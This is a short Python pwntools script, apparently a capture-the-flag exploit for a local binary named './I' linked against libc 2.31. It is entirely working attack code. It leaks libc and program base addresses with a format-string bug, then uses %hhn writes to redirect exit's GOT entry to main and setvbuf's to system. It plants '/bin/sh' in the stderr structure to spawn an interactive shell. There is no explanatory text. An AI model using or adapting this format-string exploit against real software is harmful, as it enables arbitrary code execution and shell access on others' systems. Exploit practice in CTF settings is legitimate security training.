from pwn import *

###Addr
#  libc2.31
main_offset = 0x1211
exit_got_offset = 0x5018
setvbuf_got_offset = 0x5038
libc_start_offset = 0x26fc0+243
system_offset = 0x55410
stderr_struct_offset = 0x1ec5c0

###Exploit
r = process('./I',env={'LD_PRELOAD':'./libc-2.31.so'})

r.sendlineafter('name?\n','%11$p%15$p')
r.recvline()
leaks = r.recvline()[:-1].split(b'0x')[1:]
libc_start_addr = int(leaks[0],16)
libc_base = libc_start_addr-libc_start_offset
print(hex(libc_base))
main_addr = int(leaks[1],16)
code_base = main_addr-main_offset
print(hex(code_base))

target = []
for i in range(8):
    target.append([(code_base+main_offset>>(i*8))&0xff,code_base+exit_got_offset+i])
for i in range(8):
    target.append([(libc_base+system_offset>>(i*8))&0xff,code_base+setvbuf_got_offset+i])
for i in range(8):
    target.append([(u64(b'/bin/sh\x00')>>(i*8))&0xff,libc_base+stderr_struct_offset+i])
target = sorted(target)
for i in range(23,0,-1):
    target[i][0]-=target[i-1][0]

payload = b''
for i in range(24):
    if target[i][0]==0:
        payload+=f'%{39+i}$hhn'.encode()
    else:
        payload+=f'%{target[i][0]}c%{39+i}$hhn'.encode()

payload = payload.ljust(0x108,b'\x00')
for i in range(24):
    payload+=p64(target[i][1])

r.sendlineafter('us?\n',payload)

r.interactive()
